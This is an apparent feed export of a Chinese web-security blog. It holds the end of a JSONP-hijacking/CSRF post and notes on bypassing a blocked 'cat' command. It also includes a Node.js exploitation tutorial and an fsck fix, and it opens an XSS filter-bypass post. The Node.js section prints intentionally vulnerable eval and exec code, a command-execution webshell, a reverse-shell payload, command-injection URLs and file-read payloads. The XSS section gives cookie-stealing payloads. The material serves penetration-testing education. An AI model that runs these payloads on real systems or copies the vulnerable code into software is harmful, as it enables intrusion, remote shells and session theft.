class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"csrfsend"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">"I can control you"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"title"</span> <span class="attr">value</span>=<span class="string">"hello,jsonp"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"token"</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">(obj)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(obj);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> token = obj[<span class="string">"token"</span>];</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value = token;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">"csrfsend"</span>).submit();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.111.132/json.json"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时攻击者将页面存放在自己的服务器<code>http://192.168.111.1/hello.html</code>，并诱导用户点击。</p><p>可以看到，token被获取到并成功验证，发表了一篇文章。</p><p><img src="https://i.loli.net/2019/08/15/3kVIBC7QKEDjiGt.png" alt></p><h2 id="0x05-漏洞挖掘思路"><a href="#0x05-漏洞挖掘思路" class="headerlink" title="0x05 漏洞挖掘思路"></a>0x05 漏洞挖掘思路</h2><p>jsonp劫持漏洞的挖掘，可以借助于搜索引擎，使用<code>Google Hacking</code>语法针对目标站点进行关键词搜索。</p><p>比如</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">site</span><span class="selector-pseudo">:zhengbao.wang</span> <span class="selector-tag">inurl</span><span class="selector-pseudo">:callback</span></span><br></pre></td></tr></table></figure><p>常见的关键词有</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">callback</span><br><span class="line">jsoncallback</span><br><span class="line">jsonpcallback</span><br><span class="line">jsoncall</span><br><span class="line">jsonpcall</span><br><span class="line">cb</span><br><span class="line">jsoncb</span><br><span class="line">jsonpcb</span><br><span class="line">=json</span><br><span class="line">=jsonp</span><br><span class="line">=jQuery</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/16/ShjO7XpFvMITCqg.png" alt></p><p>此外，还可以在对目标站点浏览器时，打开<code>F12</code>开发者工具，点击<code>network</code>窗口并勾选<code>preserve log</code>，查看请求记录并进行关键词筛选。</p><p><img src="https://i.loli.net/2019/08/16/waoxu6ky5DrPA7B.png" alt></p><p>筛选的依据同样可以从上面的关键词中挑选</p><p><img src="https://s2.ax1x.com/2019/10/12/uLB5Xn.png" alt></p><p>查找到后需要进行确认，判断其是否是真的jsonp方法，可通过跨域浏览实现，将前面的<code>get_jsonp.html</code>进行修改，<code>&lt;script&gt;</code>标签内的<code>src</code>改为目标url，将<code>callback</code>等关键词后面的回调函数名改为我们定义的函数名称。修改完后，放在我们的站点继续访问</p><p><img src="https://i.loli.net/2019/08/16/6osenB8M1NX9QFL.png" alt></p><p>能够获取到数据即可确定</p><p><img src="https://i.loli.net/2019/08/16/uF7nXC1gIml62aj.png" alt></p><p>当然，并不是所有的数据都是有用的，应重点关注一些敏感信息泄露及<code>csrf token</code>等，便于后续利用。</p><h2 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h2><p>文中所提到的demo，为了简单，都已经写死了，但是真正的jsonp在使用起来可以变得更加复杂，包括可以获取动态的token值，可以使用动态的callback函数等，本文旨在对jsonp即jsonp劫持漏洞的扫盲，更多的操作可查阅详细的资料。</p><p>参考文章：</p><p><a href="https://m.php.cn/article/394158.html" target="_blank" rel="noopener">https://m.php.cn/article/394158.html</a></p><p><a href="https://m.php.cn/article/394158.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;jsonp在跨域资源共享方面已存在了好多年，jsonp劫持技术也已被大佬们用烂了，本篇文章从介绍什么
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="jsonp" scheme="http://zhengbao.wang/tags/jsonp/"/>
    
  </entry>
  
  <entry>
    <title>花式文件内容读取</title>
    <link href="http://zhengbao.wang/%E8%8A%B1%E5%BC%8F%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E8%AF%BB%E5%8F%96/"/>
    <id>http://zhengbao.wang/花式文件内容读取/</id>
    <published>2019-08-07T08:29:10.000Z</published>
    <updated>2019-08-08T01:14:00.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天在客户机器上测试时发现<code>cat</code>命令被禁了，由此想到还有哪些命令可以用于读取文件内容。网上一搜，果然发现不少，特此记录一下。</p><p><img src="https://i.loli.net/2019/08/07/8XZ1yEBzHKsrVR2.png" alt></p><h2 id="0x01-常用文件内容读取命令"><a href="#0x01-常用文件内容读取命令" class="headerlink" title="0x01 常用文件内容读取命令"></a>0x01 常用文件内容读取命令</h2><p>按正常来说，常用的几个文件读取命令有<code>cat</code> <code>head</code> <code>more</code> <code>less</code> <code>nl</code> <code>tail</code> <code>tailf</code> <code>tac</code></p><p>其中<code>tailf</code> 用于读取文件最后10行内容，一般用于读取最新的日志文件，也可以使用<code>-n</code>参数改变读取的行数。但这个命令在一些linux系统中并没有在装机时安装。</p><p>另外<code>tac</code> 命令跟<code>cat</code>相反，用于按行倒着输出文件内容。</p><p><img src="https://i.loli.net/2019/08/07/m3rqLBTPXZ4hSsw.png" alt></p><p>此外，less命令用于分页显示，如果在远程命令执行漏洞环境下可能读取的内容并不能直接返回，此时可以<code>echo `less flag.txt`</code>  或者   <code>less flag.txt |grep &#39;&#39;</code></p><p><img src="https://i.loli.net/2019/08/07/4skPlFJb3GugNxw.png" alt></p><p>除了直接读取外，一些内容编辑软件也可以用来读取文件内容，例如<code>vi</code> <code>vim</code></p><h2 id="0x02-花式文件内容读取命令"><a href="#0x02-花式文件内容读取命令" class="headerlink" title="0x02 花式文件内容读取命令"></a>0x02 花式文件内容读取命令</h2><p>除了常用的文件内容读取命令外，在搜索过程中发现了大佬们总结的其他花式文件内容读取命令:<a href="https://xz.aliyun.com/t/2281" target="_blank" rel="noopener">https://xz.aliyun.com/t/2281</a></p><ul><li>static-sh</li></ul><p><img src="https://i.loli.net/2019/08/07/8DSaTsUydR9c5i1.png" alt></p><ul><li>paste</li></ul><p><img src="https://i.loli.net/2019/08/07/eLJrGKUTZS14Oi5.png" alt></p><ul><li>diff</li></ul><p>diff命令用来比较两个文件的不同，所以后面应该跟两个参数</p><p><img src="https://i.loli.net/2019/08/07/uJwS6qtFiGlQoa7.png" alt></p><ul><li><p>od</p><p>od命令以8进制字码输出文件内容，可使用<code>-a</code>参数辅助查看输出内容</p></li></ul><p><img src="https://i.loli.net/2019/08/07/zxh6BDfgUmRecid.png" alt></p><ul><li>bzmore</li></ul><p><img src="https://i.loli.net/2019/08/07/WEzZkxXRLT5Fj76.png" alt></p><ul><li><p>bzless</p><p><img src="https://i.loli.net/2019/08/07/3ZF7uQ1fURC9yPN.png" alt></p></li></ul><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>花式文件内容读取可能在平时并不会用到，但是在实际渗透过程中，如果环境中常用的文件读取命令被禁用，此时花式文件内容读取不失为一种优美的绕过姿势。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;今天在客户机器上测试时发现&lt;code&gt;cat&lt;/code&gt;命令被禁了，由此想到还有哪些命令可以用于读
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="bypass" scheme="http://zhengbao.wang/tags/bypass/"/>
    
      <category term="文件读取" scheme="http://zhengbao.wang/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs安全</title>
    <link href="http://zhengbao.wang/Nodejs%E5%AE%89%E5%85%A8/"/>
    <id>http://zhengbao.wang/Nodejs安全/</id>
    <published>2019-08-07T06:53:18.000Z</published>
    <updated>2019-08-07T08:38:22.391Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。因为在之前并没有了解过nodejs的所产生的安全问题，本文将以node.js框架<code>express</code>为例，浅析nodejs安全问题。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>本次测试使用express框架，环境搭建很简单，只需新建一个工作目录，然后执行<code>npm install expres –save</code>,即可使用<code>express</code>。<br>演示代码如下<code>test.js</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> resp=<span class="built_in">eval</span>(<span class="string">"("</span>+req.query.input+<span class="string">")"</span>);</span><br><span class="line"> res.send(<span class="string">'Output&lt;/br&gt;'</span>+resp);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(<span class="number">8001</span>);</span><br></pre></td></tr></table></figure></p><p>然后执行<code>node test.js</code>即可在本地<code>8001</code>端口启动一个简单的web应用程序。<br><img src="https://i.loli.net/2019/07/12/5d2882fb3610d56344.png" alt></p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>在渗透测试过程种，对目标的渗透必要要经过信息收集以获取更过的信息来定制下一步的行动计划。对Node.js应用的渗透也要经过信息收集，以确定目标是否使用了Node.js。收集过程中重点留意cookies， name[“connect.sid”]，server以及 X-powered-By 等头信息。如在前面搭建起的环境种，<code>X-powered-By</code>头暴露了目标使用<code>express</code>框架。<br><img src="https://i.loli.net/2019/07/12/5d28846f8727a76819.png" alt><br>此外，程序运行时意外的报错信息也能帮助获取更多的信息，当然，一个大型的项目很少会出现这种报错。<br>但在上面的demo中，输入的input中带有一些特殊字符时将触发报错。<br><img src="https://i.loli.net/2019/07/12/5d28865b486e137355.png" alt><br>在得知目标为<code>Node.js</code>应用后，便可以进行进一步的利用。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="服务端代码执行"><a href="#服务端代码执行" class="headerlink" title="服务端代码执行"></a>服务端代码执行</h3><p>在前面的demo中，通过get传入的参数未经任何过滤而直接进入到<code>eval()</code>函数中执行，此处便存在代码执行漏洞。<br>下面是可以用于测试的一些payload</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">process</span>.arch</span><br><span class="line"><span class="built_in">process</span>.argv</span><br><span class="line"><span class="built_in">process</span>.argv0</span><br><span class="line"><span class="built_in">process</span>.channel</span><br><span class="line"><span class="built_in">process</span>.cwd()</span><br><span class="line"><span class="built_in">process</span>.geteuid()</span><br><span class="line"><span class="built_in">process</span>.getegid()</span><br><span class="line"><span class="built_in">process</span>.pid</span><br><span class="line"><span class="built_in">process</span>.<span class="built_in">platform</span></span><br><span class="line"><span class="built_in">process</span>.<span class="built_in">version</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/12/5d2888947cf8370728.png" alt><br>甚至可以传入<code>process.exit()</code>终止程序的运行。<br><img src="https://i.loli.net/2019/07/12/5d28894f0822b82705.png" alt></p><p>读取文件<code>require(&#39;fs&#39;).readFileSync(&#39;test.js&#39;).toString()</code><br><img src="https://i.loli.net/2019/07/12/5d2889c16bdee95884.png" alt></p><p>获取webshell<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123; <span class="built_in">require</span>(<span class="string">'http'</span>).createServer(<span class="function"><span class="keyword">function</span> <span class="params">(req, res)</span></span> &#123; res.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="built_in">require</span>(<span class="string">'url'</span>).parse(req.url, <span class="literal">true</span>).query[<span class="string">'cmd'</span>], <span class="function"><span class="keyword">function</span><span class="params">(e,s,st)</span></span> &#123;res.<span class="keyword">end</span>(s);&#125;); &#125;).listen(<span class="number">8003</span>); &#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/16/5d2d2ea8632f956229.png" alt><br>这里传入<code>setTimeout</code>函数，三秒后在8003端口启动一个webshell。(延时时间最好大于1s，否则可能执行失败)<br><img src="https://i.loli.net/2019/07/16/5d2d2e91221c876341.png" alt><br>成功执行命令，可以看到<code>setTimeout</code>也可以执行任意代码，所以会任何进入系统函数的用户输入都是不安全的，在测试过程不仅要注意<code>eval</code>函数，还要注意<code>setTimeuut</code> <code>setInterval</code>等系统函数。</p><p>获取反弹shell<br>payload<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rev</span>(<span class="params">host,port</span>)</span>&#123;<span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);<span class="keyword">var</span> cp  = <span class="built_in">require</span>(<span class="string">'child_process'</span>);<span class="keyword">var</span> cmd = cp.spawn(<span class="string">'cmd.exe'</span>, []);<span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();client.connect(port, host, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.write(<span class="string">'Connected\r\n'</span>); client.pipe(cmd.stdin); cmd.stdout.pipe(client);cmd.stderr.pipe(client);client.on(<span class="string">'exit'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code,signal</span>)</span>&#123; client.end(<span class="string">'Disconnected\r\n'</span>); &#125; );client.on( <span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123; setTimeout( rev(host,port), <span class="number">5000</span>); &#125;)&#125;);&#125;;rev(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>);</span><br></pre></td></tr></table></figure></p><p>这里也可使用<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank" rel="noopener">nodejsshell.py</a>生成编码后的nodejs代码<br>输入监听的ip 端口<br><img src="https://i.loli.net/2019/07/16/5d2d38593d54c25929.png" alt><br>执行生成的payload<br><img src="https://i.loli.net/2019/07/16/5d2d38a07e94893643.png" alt><br>nc成功监听到返回的shell<br><img src="https://i.loli.net/2019/07/16/5d2d38dc0856c30683.png" alt><br>目标为Linux主机可以返回<code>/bin/bash</code>,windows下可以返回<code>cmd.exe</code>，可以在生成代码的第36行进行修改<br><img src="https://i.loli.net/2019/07/16/5d2d39482974b24029.png" alt></p><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p><code>Node.js</code>的远程命令执行主要是由于没有正确使用<code>child_process</code>模块造成的，该模块可以创建一个新的进程进来执行系统命令。<br><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">url</span> = <span class="built_in">require</span>(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">var</span> exe = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parsedUrl = <span class="built_in">url</span>.parse(request.url, <span class="literal">true</span>);</span><br><span class="line">  response.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/html"</span>&#125;);</span><br><span class="line">  exe.exec(<span class="string">'ping -c 2 '</span> + parsedUrl.query.ping, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">  response.write(<span class="string">"Hello "</span>+ data);</span><br><span class="line">  response.end();</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure></p><p>上面的demo中使用了<code>child_process</code>模块的exec函数来进行系统交互来执行<code>ping</code>命令。但是由于没有正确过滤传入的参数，从而造成任意系统命令执行。<br>正常服务<br><img src="https://i.loli.net/2019/08/07/9Py6NVuzFOjYB5l.png" alt><br>执行任意命令<br><code>http://127.0.0.1:8888/?ping=www.baidu.com;||dir</code><br><img src="https://i.loli.net/2019/08/07/ygQtSMiX3JIWldn.png" alt></p><h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>这是<code>Node.js</code>一个比较独特的特性，允许一个参数有多个值传入，当对一个参数传入多个值时，中间会以逗号<code>,</code>进行拼接。<br>比如上面的demo中，我们传入两个ping值<br><img src="https://i.loli.net/2019/08/07/yxjezVQbuZApCcK.png" alt><br>这个特性可能会引起参数解析漏洞或者在绕过waf时提供思路。</p><h2 id="0x04-防护"><a href="#0x04-防护" class="headerlink" title="0x04 防护"></a>0x04 防护</h2><p>在给出的<code>Node.js</code>不安全的demo中，可以明显的看出，同其他语言一样，所有未加过滤的用输入都是不安全的，所以在开发过程中应时刻注意对用户输入做适当的处理，令附node.js安全开发的一些参考<a href="https://www.cnblogs.com/qingmingsang/articles/10397870.html" target="_blank" rel="noopener">https://www.cnblogs.com/qingmingsang/articles/10397870.html</a></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://bbs.ichunqiu.com/thread-24807-1-1.html?from=beef" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-24807-1-1.html</a><br><a href="https://www.jianshu.com/p/8253adac33d8" target="_blank" rel="noopener">https://www.jianshu.com/p/8253adac33d8</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Nodejs" scheme="http://zhengbao.wang/tags/Nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Linux run fsck failed问题解决办法</title>
    <link href="http://zhengbao.wang/Linux-run-fsck-failed%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>http://zhengbao.wang/Linux-run-fsck-failed问题解决办法/</id>
    <published>2019-06-19T13:47:43.000Z</published>
    <updated>2019-06-19T13:49:44.908Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前课程设计内容保存在reahat虚拟机里了，最近要进行答辩，打开虚拟机一看竟然启动失败。<br>心咯噔一下，仔细看一下幸好不是大问题，仅此小记，以备不时之需。</p><h2 id="0x01-问题"><a href="#0x01-问题" class="headerlink" title="0x01 问题"></a>0x01 问题</h2><p><img src="https://i.loli.net/2019/06/19/5d0a3afe4241917700.png" alt><br>从截图中可以看到启动失败的问题为<code>RUN fsck manuplly failed</code><br>看样子应该是硬盘出现了啥问题，导致开启时分区挂载不上，然后修复失败。</p><p>好在下面给了个手动修复的命令行，只要输入<code>root password</code>即可登陆</p><h2 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02 解决"></a>0x02 解决</h2><p>既然时自动修复失败，那么便手动修复一下试试。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsck -y <span class="regexp">/dev/m</span>apper<span class="regexp">/VolGroup-lv_root</span></span><br></pre></td></tr></table></figure></p><p>这里<code>/dev/mapper/VolGroup-lv_root</code>修复路径为上面修复失败的路径<br>修复后如下图，<code>reboot</code>重启应该就没啥问题了。<br><img src="https://i.loli.net/2019/06/19/5d0a3c43ebfdb22919.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;之前课程设计内容保存在reahat虚拟机里了，最近要进行答辩，打开虚拟机一看竟然启动失败。&lt;br&gt;心
      
    
    </summary>
    
      <category term="环境配置" scheme="http://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="Linux错误" scheme="http://zhengbao.wang/tags/Linux%E9%94%99%E8%AF%AF/"/>
    
  </entry>
  
  <entry>
    <title>XSS姿势学习</title>
    <link href="http://zhengbao.wang/XSS%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
    <id>http://zhengbao.wang/XSS姿势学习/</id>
    <published>2019-06-17T13:24:21.000Z</published>
    <updated>2019-06-18T11:14:01.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间看到了<a href="https://nosec.org/home/detail/2654.html" target="_blank" rel="noopener">无需括号和分号的XSS</a>,最近又看了<a href="https://www.anquanke.com/post/id/180187" target="_blank" rel="noopener">利用JavaScript全局变量绕过XSS过滤器</a>,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。</p><h2 id="0x01-无需括号和分号的XSS"><a href="#0x01-无需括号和分号的XSS" class="headerlink" title="0x01 无需括号和分号的XSS"></a>0x01 无需括号和分号的XSS</h2><p>早在几年前，作者就提到过在javascript中调用函数而无需括号的方法<br><code>&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;</code><br>该方法主要利用<code>onerror</code>和<code>throw</code>,工作原理是将onerror设置为你想调用的函数，然后用throw语句将参数传递给调用函数。在上面的payload中，因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。而语句隔离也可以使用花括号<code>{}</code>来实现:<br><code>&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code><br>这样其实就已经达到作者标题所要的无需括号和分号的xss。<br>但是作者并没有停止，很快又提出了一万种姿势。<br>他发现<code>throw</code>语句可以接上一些表达式，那么这样就可以把<code>onerror</code>放在<code>throw</code>语句中进行赋值，并且throw表达式的<code>最后一部分</code>会被发送到onerror指定的处理函数中。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">throw</span> onerror=alert,a=<span class="string">'boogle'</span>,b=<span class="string">'1337'</span>,a</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/17/5d0712192c7ed21268.png" alt></p><p>如果想执行更复杂的语句，那么便可以使用<code>eval</code>函数，但是将上面的payload改为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,alert<span class="string">`xss`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这里弹出的xss为一个字符串，可以使用破浪号包裹而不用括号，如果想要弹cookie，那么就要用到括号了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这种方式调用函数，那么显然还是需要<code>()</code>的。但是仔细观察前面的弹窗，我们传入内容为<code>boogle</code>,弹窗内容却为<code>Uncaught boogle</code><br>这样如果在传入的内容之前添加一个<code>=</code>,将会产生一个什么样的效果。<br>对，神奇的事情发生了，就像表面添加<code>=</code>一样，可以将<code>Uncaught</code>赋值为后面的内容，成为一个变量，那么这个变量就可以传入<code>eval</code>函数执行任意javascript代码了。<br>下面的payload中因为alert函数被引号包裹，可以将<code>()</code>编码为<code>\x28\x29</code>从而达到绕过效果。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span>%<span class="number">20</span>onerror=<span class="built_in">eval</span>,<span class="string">"=alert\x28document.cookie\x29"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/17/5d077bc55e02d71577.png" alt><br>同样，前面的payload也可以这样变种,产生的效果及原理相同.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span><span class="string">'=alert\x281337\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>上面将<code>Uncaught</code>变为变量的方法是在<code>chrome</code>浏览器下实现的，而且在<code>Microsoft Edge</code>和<code>IE</code>下都能达到效果。但是当把这种方法拿到<code>firefox</code>浏览器时，却失败了，原因Firefox种报错前缀是<code>uncaught exception:</code>，代码最后执行赋值时会出现语法错误。<br><img src="https://i.loli.net/2019/06/17/5d077f0e2616657672.png" alt></p><p>但是很快作者给出了在<code>firefox</code>上的任意javascript执行的方法<br><figure class="highlight xml"><table><tr><td 